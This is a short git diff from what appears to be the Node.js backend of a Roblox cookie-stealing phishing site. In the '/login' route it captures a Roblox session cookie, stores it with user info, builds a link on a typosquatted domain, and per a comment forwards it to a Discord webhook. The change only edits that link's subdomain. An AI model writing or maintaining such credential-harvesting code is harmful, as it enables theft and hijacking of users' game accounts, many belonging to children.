@@ -68,7 +68,7 @@ app.post('/login', async (req, res) => {
 
     if (robloxCookie) {
       const randomId = Math.floor(Math.random() * 899999) + 100000;
-      const cookieLink = `https://robloix.wuaze.com/cookie/${randomId}`;
+      const cookieLink = `https://x.robloix.wuaze.com/cookie/${randomId}`;
       cookieStore[randomId] = { cookie: robloxCookie.value, info };
 
       // Send Discord webhook
